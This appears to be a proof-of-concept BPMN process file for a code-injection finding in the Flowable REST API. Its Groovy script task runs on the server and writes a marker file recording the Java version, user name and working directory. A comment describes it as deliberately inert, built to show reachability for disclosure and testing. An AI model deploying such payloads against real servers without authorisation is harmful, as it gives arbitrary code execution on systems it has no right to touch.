<?xml version="1.0" encoding="UTF-8"?>
<!--
  PoC payload for Flowable Engine REST API — finding V1 (CWE-94).

  Deliberately inert. The uploaded Groovy writes one marker file under the
  target's own temp directory and does nothing else: no reverse shell, no
  network callback, no data access, no persistence.

  Demonstrating reachability does not require demonstrating impact. See
  ../../README.md ("The one rule that shapes every PoC in this repository").
-->
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
             xmlns:flowable="http://flowable.org/bpmn"
             targetNamespace="http://bpmn.io/schema/bpmn">

  <process id="flowablePocGroovy" name="Flowable PoC - Groovy reachability" isExecutable="true">
    <startEvent id="start"/>
    <sequenceFlow id="f1" sourceRef="start" targetRef="probe"/>

    <!-- No sandbox, no SecureASTCustomizer, no deny list. -->
    <scriptTask id="probe" name="write marker" scriptFormat="groovy">
      <script>
        new File(System.getProperty("java.io.tmpdir") + "/flowable-poc-v1.txt").text =
            "V1-REACHABLE " +
            "jvm=" + System.getProperty("java.version") + " " +
            "user=" + System.getProperty("user.name") + " " +
            "cwd=" + System.getProperty("user.dir")
      </script>
    </scriptTask>

    <sequenceFlow id="f2" sourceRef="probe" targetRef="end"/>
    <endEvent id="end"/>
  </process>
</definitions>
